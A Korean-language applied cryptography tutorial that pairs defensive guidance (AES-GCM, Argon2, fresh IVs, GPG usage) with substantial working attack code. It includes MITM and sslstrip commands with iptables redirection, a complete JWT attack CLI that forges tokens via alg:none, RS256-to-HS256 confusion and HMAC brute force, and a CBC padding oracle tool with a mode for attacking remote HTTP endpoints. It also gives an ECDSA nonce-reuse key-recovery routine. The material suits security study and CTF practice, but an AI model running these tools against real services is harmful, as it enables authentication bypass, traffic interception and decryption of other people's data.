# 응용 암호학 — 실전 취약점과 방어

## 1. 공개키 인프라 (PKI) 공격

### 인증서 위조 및 중간자 공격

```bash
# mitmproxy로 HTTPS 인터셉트
mitmproxy --mode transparent

# 자가 서명 인증서로 MITM
openssl req -x509 -newkey rsa:4096 -keyout mitm.key \
    -out mitm.crt -days 365 -nodes \
    -subj "/C=KR/O=Example Corp/CN=*.target.com"

# sslstrip (HTTPS → HTTP 다운그레이드)
sslstrip -l 10000 -w /tmp/sslstrip.log
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Bettercap SSL strip
sudo bettercap
set https.proxy.sslstrip true
https.proxy on
```

### 인증서 투명성 (Certificate Transparency) 활용

```bash
# crt.sh - 발급된 인증서 검색
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
    python3 -c "
import json, sys
certs = json.load(sys.stdin)
for c in certs:
    print(c.get('name_value', '').replace('\\n', '\n'))
" | sort -u

# 서브도메인 발견에 활용
curl -s "https://crt.sh/?q=%.company.com&output=json" | \
    python3 -c "
import json, sys, re
data = json.load(sys.stdin)
domains = set()
for cert in data:
    names = cert.get('name_value', '')
    for domain in names.split():
        if domain.endswith('.company.com'):
            domains.add(domain)
for d in sorted(domains):
    print(d)
"
```

---

## 2. PGP/GPG 운용

```bash
# GPG 키 생성
gpg --full-generate-key

# 공개키 내보내기
gpg --export --armor user@email.com > public_key.asc

# 개인키 내보내기 (백업)
gpg --export-secret-keys --armor user@email.com > private_key.asc

# 파일 암호화 (수신자 공개키로)
gpg --encrypt --recipient recipient@email.com secret.txt
# → secret.txt.gpg 생성

# 파일 복호화
gpg --decrypt secret.txt.gpg

# 파일 서명
gpg --sign --detach-sig document.pdf
# → document.pdf.sig 생성

# 서명 검증
gpg --verify document.pdf.sig document.pdf

# GPG 키 강도 확인
gpg --edit-key user@email.com showpref

# 취약한 GPG 설정 탐지
# SHA-1 서명 사용 시:
gpg --list-sigs | grep "SHA1"
```

---

## 3. JWT (JSON Web Token) 심층 분석

### JWT 구조 및 알고리즘

```python
#!/usr/bin/env python3
"""
JWT 분석 및 공격 도구 CLI
사용: python3 jwt_attacks.py decode  --token <JWT>
      python3 jwt_attacks.py none    --token <JWT> --claim role=admin
      python3 jwt_attacks.py brute   --token <JWT> --wordlist rockyou.txt
      python3 jwt_attacks.py confuse --token <JWT> --pubkey public.pem
"""

from __future__ import annotations
import argparse
import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path
from typing import Any


# ── Base64url 유틸 ────────────────────────────────────────────

def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(data: bytes | dict) -> str:
    if isinstance(data, dict):
        data = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# ── JWT 파싱 ─────────────────────────────────────────────────

def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """서명 검증 없이 디코딩"""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("유효하지 않은 JWT 형식")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


# ── 공격 1: alg:none ─────────────────────────────────────────

def jwt_none_attack(token: str, extra_claims: dict[str, Any]) -> str:
    """
    alg:none 공격 — 서명 제거 후 페이로드 수정
    취약한 라이브러리는 none 알고리즘 수락
    """
    header, payload, _ = decode_jwt(token)
    header["alg"] = "none"
    payload.update(extra_claims)
    msg = f"{b64url_encode(header)}.{b64url_encode(payload)}"
    return f"{msg}."   # 서명 없음


# ── 공격 2: alg 혼동 RS256 → HS256 ──────────────────────────

def jwt_algorithm_confusion(token: str, pubkey_pem: str,
                             extra_claims: dict[str, Any]) -> str:
    """
    RS256 → HS256 알고리즘 혼동 공격
    서버가 공개키를 HS256 비밀키로 사용해 검증할 때 성공

    pubkey_pem: PEM 형식 RSA 공개키 문자열
    """
    _, payload, _ = decode_jwt(token)
    payload.update(extra_claims)

    header = {"alg": "HS256", "typ": "JWT"}
    msg    = f"{b64url_encode(header)}.{b64url_encode(payload)}"

    # 공개키 바이트로 HMAC-SHA256 서명
    key_bytes = pubkey_pem.encode() if isinstance(pubkey_pem, str) else pubkey_pem
    sig = hmac.new(key_bytes, msg.encode(), hashlib.sha256).digest()
    return f"{msg}.{b64url_encode(sig)}"


# ── 공격 3: HMAC 키 브루트포스 ───────────────────────────────

def jwt_brute_force(token: str, wordlist: Path,
                    verbose: bool = False) -> str | None:
    """HS256/HS384/HS512 비밀키 오프라인 브루트포스"""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("유효하지 않은 JWT")

    header = json.loads(b64url_decode(parts[0]))
    alg    = header.get("alg", "HS256").upper()
    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                "HS512": hashlib.sha512}
    hash_fn = hash_map.get(alg)
    if hash_fn is None:
        print(f"[-] 지원하지 않는 알고리즘: {alg}", file=sys.stderr)
        return None

    message   = f"{parts[0]}.{parts[1]}".encode()
    signature = b64url_decode(parts[2])

    try:
        with wordlist.open("r", encoding="latin-1", errors="replace") as fp:
            for i, line in enumerate(fp):
                secret = line.rstrip("\n")
                if hmac.compare_digest(
                    hmac.new(secret.encode(), message, hash_fn).digest(),
                    signature,
                ):
                    print(f"[+] 비밀키 발견: {secret!r}  (라인 {i+1})")
                    return secret
                if verbose and i % 100_000 == 0:
                    print(f"    [{i:,}] 시도 중...", end="\r")
    except OSError as e:
        print(f"[-] 파일 오류: {e}", file=sys.stderr)

    print("[-] 브루트포스 실패")
    return None


# ── 공격 4: 만료 시간 조작 ───────────────────────────────────

def jwt_modify_claims(token: str, claims: dict[str, Any]) -> str:
    """
    서명 없이 클레임만 변조 (서버가 서명 검증을 건너뛸 때)
    실제 공격에선 none 공격과 함께 사용
    """
    header, payload, sig = decode_jwt(token)
    payload.update(claims)
    return f"{b64url_encode(header)}.{b64url_encode(payload)}.{sig}"


# ── CLI ──────────────────────────────────────────────────────

def parse_claims(raw: list[str]) -> dict[str, Any]:
    """key=value 목록을 dict로 변환. value는 JSON 파싱 시도"""
    out: dict[str, Any] = {}
    for kv in raw:
        k, _, v = kv.partition("=")
        try:
            out[k] = json.loads(v)
        except (json.JSONDecodeError, ValueError):
            out[k] = v
    return out


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT 공격 도구")
    sub = parser.add_subparsers(dest="cmd", required=True)

    # decode
    p = sub.add_parser("decode", help="JWT 디코딩 (검증 없음)")
    p.add_argument("--token", required=True)

    # none
    p = sub.add_parser("none", help="alg:none 공격")
    p.add_argument("--token",  required=True)
    p.add_argument("--claim",  nargs="*", default=[], metavar="K=V",
                   help='예: role=admin "exp=9999999999"')

    # brute
    p = sub.add_parser("brute", help="HMAC 키 브루트포스")
    p.add_argument("--token",    required=True)
    p.add_argument("--wordlist", type=Path, required=True)
    p.add_argument("--verbose",  action="store_true")

    # confuse
    p = sub.add_parser("confuse", help="RS256→HS256 알고리즘 혼동")
    p.add_argument("--token",  required=True)
    p.add_argument("--pubkey", required=True, help="공개키 PEM 파일")
    p.add_argument("--claim",  nargs="*", default=[], metavar="K=V")

    # modify
    p = sub.add_parser("modify", help="클레임 수정 (서명 유지)")
    p.add_argument("--token",  required=True)
    p.add_argument("--claim",  nargs="*", default=[], metavar="K=V")

    args = parser.parse_args()

    if args.cmd == "decode":
        header, payload, sig = decode_jwt(args.token)
        print("Header :", json.dumps(header,  indent=2, ensure_ascii=False))
        print("Payload:", json.dumps(payload, indent=2, ensure_ascii=False))
        print("Sig    :", sig[:32], "..." if len(sig) > 32 else "")

    elif args.cmd == "none":
        forged = jwt_none_attack(args.token, parse_claims(args.claim))
        print("[+] 위조된 토큰:")
        print(forged)

    elif args.cmd == "brute":
        jwt_brute_force(args.token, args.wordlist, args.verbose)

    elif args.cmd == "confuse":
        pubkey = Path(args.pubkey).read_text()
        forged = jwt_algorithm_confusion(
            args.token, pubkey, parse_claims(args.claim)
        )
        print("[+] 위조된 토큰:")
        print(forged)

    elif args.cmd == "modify":
        modified = jwt_modify_claims(args.token, parse_claims(args.claim))
        print("[*] 수정된 토큰 (서명 변경 없음):")
        print(modified)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        demo = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        h, p, _ = decode_jwt(demo)
        print("[Demo] Header :", h)
        print("[Demo] Payload:", p)
        print("\n[Demo] alg:none 공격:")
        print(jwt_none_attack(demo, {"role": "admin"}))
    else:
        main()
```

---

## 4. 암호화 구현 취약점

### Padding Oracle 공격

```python
#!/usr/bin/env python3
"""
CBC Padding Oracle 공격 PoC + 로컬 시뮬레이션 / HTTP 오라클 지원
사용: python3 padding_oracle.py local --plaintext "Attack at dawn!!"
      python3 padding_oracle.py http  --url https://target.com/decrypt \
                                      --iv IV_HEX --ct CT_HEX
"""

from __future__ import annotations
import argparse
import base64
import os
import sys
from typing import Callable

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("[-] pycryptodome 필요: pip install pycryptodome", file=sys.stderr)
    sys.exit(1)

BLOCK = 16


# ── 패딩 오라클 공격 핵심 ────────────────────────────────────

def padding_oracle_decrypt(
    ciphertext: bytes,
    iv: bytes,
    oracle: Callable[[bytes, bytes], bool],
    verbose: bool = False,
) -> bytes:
    """
    CBC Padding Oracle 공격으로 키 없이 평문 복원

    원리:
      P[i] = AES_Dec(C[i]) ⊕ C[i-1]
      수정된 C'[i-1][j] 를 조작해 AES_Dec(C[i])[j] 를 유도:
        패딩 값 pad_val 이 성립하는 guess 에서
        intermediate[j] = guess ⊕ pad_val
      최종 평문:
        P[j] = intermediate[j] ⊕ C[i-1][j]
    """
    blocks = [iv] + [
        ciphertext[i:i + BLOCK] for i in range(0, len(ciphertext), BLOCK)
    ]
    plaintext = bytearray()

    for blk_idx in range(1, len(blocks)):
        curr  = blocks[blk_idx]
        prev  = blocks[blk_idx - 1]
        inter = bytearray(BLOCK)   # AES_Dec(curr)

        for byte_pos in range(BLOCK - 1, -1, -1):
            pad_val = BLOCK - byte_pos

            # 이미 복원된 intermediate 바이트로 뒤쪽 채우기
            modified = bytearray(BLOCK)
            for k in range(byte_pos + 1, BLOCK):
                modified[k] = inter[k] ^ pad_val

            found = False
            for guess in range(256):
                modified[byte_pos] = guess
                if oracle(bytes(modified), curr):
                    # 0x01 패딩이 성립 → intermediate[byte_pos] 확정
                    inter[byte_pos] = guess ^ pad_val
                    found = True
                    break

            if not found:
                raise RuntimeError(
                    f"오라클 응답 없음: 블록{blk_idx} 바이트{byte_pos}"
                )

        block_plain = bytes(i ^ p for i, p in zip(inter, prev))
        plaintext.extend(block_plain)
        if verbose:
            print(f"  블록 {blk_idx:02d}: {block_plain.hex()}  "
                  f"({block_plain!r})")

    try:
        return bytes(unpad(plaintext, BLOCK))
    except ValueError:
        return bytes(plaintext)


# ── 로컬 오라클 (데모용) ────────────────────────────────────

class LocalOracle:
    """서버 역할: 올바른 PKCS7 패딩이면 True"""
    def __init__(self) -> None:
        self.key = os.urandom(16)
        self._calls = 0

    def encrypt(self, plaintext: bytes) -> tuple[bytes, bytes]:
        iv = os.urandom(BLOCK)
        ct = AES.new(self.key, AES.MODE_CBC, iv).encrypt(pad(plaintext, BLOCK))
        return iv, ct

    def __call__(self, iv: bytes, ciphertext: bytes) -> bool:
        self._calls += 1
        try:
            unpad(
                AES.new(self.key, AES.MODE_CBC, iv).decrypt(ciphertext),
                BLOCK,
            )
            return True
        except (ValueError, KeyError):
            return False


# ── HTTP 오라클 ─────────────────────────────────────────────

def make_http_oracle(
    url: str,
    param: str = "token",
    success_codes: tuple[int, ...] = (200, 302),
) -> Callable[[bytes, bytes], bool]:
    """실제 웹 앱의 패딩 오라클을 HTTP 요청으로 감지"""
    try:
        import requests
    except ImportError:
        print("[-] requests 필요: pip install requests", file=sys.stderr)
        sys.exit(1)

    session = requests.Session()

    def oracle(iv: bytes, ct: bytes) -> bool:
        token = base64.b64encode(iv + ct).decode()
        try:
            r = session.get(url, params={param: token}, timeout=10)
            return r.status_code in success_codes
        except requests.RequestException:
            return False

    return oracle


# ── CLI ──────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="CBC Padding Oracle 공격 PoC"
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    # 로컬 시뮬레이션
    lp = sub.add_parser("local", help="로컬 오라클 시뮬레이션")
    lp.add_argument("--plaintext", default="Attack at dawn!!", help="암호화할 평문")
    lp.add_argument("--verbose", action="store_true")

    # HTTP 오라클
    hp = sub.add_parser("http", help="원격 HTTP 오라클 공격")
    hp.add_argument("--url",    required=True, help="취약한 앱 URL")
    hp.add_argument("--iv",     required=True, help="IV (hex)")
    hp.add_argument("--ct",     required=True, help="암호문 (hex)")
    hp.add_argument("--param",  default="token", help="GET 파라미터명")
    hp.add_argument("--success-codes", nargs="+", type=int,
                    default=[200, 302], help="패딩 성공으로 판단할 HTTP 코드")
    hp.add_argument("--verbose", action="store_true")

    args = parser.parse_args()

    if args.mode == "local":
        oracle = LocalOracle()
        pt_bytes = args.plaintext.encode()
        iv, ct = oracle.encrypt(pt_bytes)
        print(f"[*] 암호화 완료  IV={iv.hex()}  CT={ct.hex()}")
        print(f"[*] 패딩 오라클 공격 시작...")

        recovered = padding_oracle_decrypt(ct, iv, oracle, args.verbose)
        print(f"\n[+] 복원된 평문: {recovered!r}")
        print(f"[*] 오라클 호출 횟수: {oracle._calls}")
        assert recovered == pt_bytes, "복원 실패"
        print("[+] 검증 성공!")

    elif args.mode == "http":
        iv = bytes.fromhex(args.iv)
        ct = bytes.fromhex(args.ct)
        oracle = make_http_oracle(
            args.url, args.param,
            tuple(args.success_codes),
        )
        print(f"[*] HTTP 패딩 오라클 공격: {args.url}")
        recovered = padding_oracle_decrypt(ct, iv, oracle, args.verbose)
        print(f"\n[+] 복원된 평문 (hex): {recovered.hex()}")
        try:
            print(f"[+] 복원된 평문 (text): {recovered.decode()}")
        except UnicodeDecodeError:
            pass


if __name__ == "__main__":
    if len(sys.argv) == 1:
        # 빠른 데모
        oracle = LocalOracle()
        iv, ct = oracle.encrypt(b"Sensitive data!!")
        result = padding_oracle_decrypt(ct, iv, oracle)
        print(f"[Demo] 복원: {result!r}  호출: {oracle._calls}")
    else:
        main()
```

### ECDSA 논스 재사용 공격

```python
from ecdsa import NIST256p, SigningKey
from hashlib import sha256
import random

def ecdsa_nonce_reuse_attack(r: int, s1: int, s2: int, 
                              z1: int, z2: int, q: int) -> int:
    """
    ECDSA에서 같은 논스 k 사용 시:
    s1 = k^-1 * (z1 + r*d) mod q
    s2 = k^-1 * (z2 + r*d) mod q
    
    k = (z1 - z2) * (s1 - s2)^-1 mod q
    d = (s1*k - z1) * r^-1 mod q
    """
    
    def modinv(a, m):
        """확장 유클리드 알고리즘으로 모듈러 역수"""
        g, x, _ = extended_gcd(a, m)
        if g != 1:
            raise ValueError("역수 없음")
        return x % m
    
    def extended_gcd(a, b):
        if a == 0:
            return b, 0, 1
        g, x, y = extended_gcd(b % a, a)
        return g, y - (b // a) * x, x
    
    # k 복원
    k = (z1 - z2) * modinv(s1 - s2, q) % q
    
    # 개인키 d 복원
    d = (s1 * k - z1) * modinv(r, q) % q
    
    return d, k

# 비트코인 사례: 같은 k로 서명 → 개인키 유출 → 지갑 탈취
# 2013년 PlayStation 3 개인키 유출 (동일 논스 사용)
```

---

## 5. 암호화 API 올바른 사용법

### Python 암호화 올바른 사용

```python
# cryptography 라이브러리 사용 (권장)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import os
import base64

class SecureCrypto:
    """안전한 암호화 구현"""
    
    @staticmethod
    def encrypt_aes_gcm(plaintext: bytes, key: bytes = None) -> dict:
        """AES-256-GCM 인증 암호화 (AEAD)"""
        if key is None:
            key = os.urandom(32)  # 256비트 키
        
        nonce = os.urandom(12)  # 96비트 논스
        
        aesgcm = AESGCM(key)
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
        
        return {
            'key': base64.b64encode(key).decode(),
            'nonce': base64.b64encode(nonce).decode(),
            'ciphertext': base64.b64encode(ciphertext).decode()
        }
    
    @staticmethod
    def decrypt_aes_gcm(encrypted: dict) -> bytes:
        """AES-256-GCM 복호화 및 인증 검증"""
        key = base64.b64decode(encrypted['key'])
        nonce = base64.b64decode(encrypted['nonce'])
        ciphertext = base64.b64decode(encrypted['ciphertext'])
        
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None)
    
    @staticmethod
    def hash_password(password: str) -> str:
        """Argon2id로 비밀번호 해싱 (권장)"""
        from argon2 import PasswordHasher
        
        ph = PasswordHasher(
            time_cost=2,        # 반복 횟수
            memory_cost=65536,  # 64MB 메모리
            parallelism=2,      # 병렬 처리
            hash_len=32,        # 해시 길이
            salt_len=16         # 솔트 길이
        )
        return ph.hash(password)
    
    @staticmethod
    def verify_password(password: str, hash_str: str) -> bool:
        """비밀번호 검증"""
        from argon2 import PasswordHasher
        from argon2.exceptions import VerifyMismatchError
        
        ph = PasswordHasher()
        try:
            return ph.verify(hash_str, password)
        except VerifyMismatchError:
            return False
    
    @staticmethod
    def derive_key(password: str, salt: bytes = None) -> tuple:
        """PBKDF2로 키 유도"""
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=600000,  # NIST 권장 600,000회
        )
        
        key = kdf.derive(password.encode())
        return key, salt
    
    @staticmethod
    def generate_token(length: int = 32) -> str:
        """암호학적으로 안전한 토큰 생성"""
        return base64.urlsafe_b64encode(os.urandom(length)).decode()

# 사용 예시
crypto = SecureCrypto()

# 파일 암호화
with open('secret.txt', 'rb') as f:
    data = f.read()

encrypted = crypto.encrypt_aes_gcm(data)
print(f"암호화 완료: {len(encrypted['ciphertext'])} bytes")

# 복호화
decrypted = crypto.decrypt_aes_gcm(encrypted)
assert decrypted == data

# 비밀번호 저장
hashed = crypto.hash_password("UserPassword123!")
is_valid = crypto.verify_password("UserPassword123!", hashed)
print(f"비밀번호 검증: {is_valid}")

# 세션 토큰
token = crypto.generate_token()
print(f"토큰: {token}")
```

---

## 6. 실전 암호 취약점 사례

### 예측 가능한 UUID 생성

```python
import uuid
import time

# 취약한 UUID 생성 (타임스탬프 기반)
def vulnerable_uuid():
    # UUID v1: 타임스탬프 + MAC 주소
    return str(uuid.uuid1())

# 안전한 UUID 생성
def secure_uuid():
    # UUID v4: 완전한 난수
    return str(uuid.uuid4())

# UUID v1 공격: 타임스탬프 추출
def extract_timestamp_from_uuid_v1(uuid_str: str):
    u = uuid.UUID(uuid_str)
    # UUID v1 타임스탬프는 1582년 10월 15일부터 100ns 단위
    timestamp = (u.time - 0x01b21dd213814000) * 100 / 1e9
    from datetime import datetime, timezone
    return datetime.fromtimestamp(timestamp, tz=timezone.utc)
```

### 잘못된 랜덤 IV 재사용

```python
# 취약한 구현
class VulnerableEncryption:
    def __init__(self):
        self.key = os.urandom(32)
        self.iv = os.urandom(16)  # 고정 IV!
    
    def encrypt(self, data: bytes) -> bytes:
        from Crypto.Cipher import AES
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)  # 항상 같은 IV
        return cipher.encrypt(pad(data, 16))

# 안전한 구현
class SecureEncryption:
    def __init__(self):
        self.key = os.urandom(32)
    
    def encrypt(self, data: bytes) -> bytes:
        iv = os.urandom(16)  # 매번 새 IV 생성
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(data, 16))
        return iv + ciphertext  # IV를 암호문 앞에 포함
    
    def decrypt(self, data: bytes) -> bytes:
        iv = data[:16]
        ciphertext = data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ciphertext), 16)
```

---

## 7. 암호화 CTF 문제 유형

```
유형 1: ECB Mode Detection
  - 반복되는 블록 패턴 탐지
  - 동일 16바이트 입력 → 동일 출력

유형 2: CBC Bit Flipping
  - IV/이전 블록 조작으로 복호화 결과 변조

유형 3: Padding Oracle
  - 서버 오류 응답으로 CBC 복호화

유형 4: RSA Small E
  - e=3, 작은 메시지 → 세제곱근

유형 5: RSA Common Factor
  - 두 공개키 GCD ≠ 1

유형 6: ECDSA Nonce Reuse
  - 같은 r값인 두 서명 → 개인키 복원

유형 7: Length Extension
  - MD5/SHA1에서 H(secret||msg) → H(secret||msg||padding||extra)

유형 8: Weak PRNG
  - time.time() 기반 시드 → 시간 범위 전수 탐색

도구:
  SageMath (수학 계산)
  PyCryptodome (구현)
  factordb (소인수 분해)
  CyberChef (변환/분석)
  RsaCtfTool (RSA 자동 공격)
```

```bash
# RsaCtfTool - RSA CTF 자동 풀이
git clone https://github.com/RsaCtfTool/RsaCtfTool
cd RsaCtfTool
pip3 install -r requirements.txt

# 공개키에서 개인키 복원 시도 (여러 공격 자동)
python3 RsaCtfTool.py --publickey public.pem --private

# n, e로 공격
python3 RsaCtfTool.py -n MODULUS -e 65537 --private

# 암호문 복호화
python3 RsaCtfTool.py --publickey public.pem \
    --uncipherfile ciphertext.bin \
    --private
```
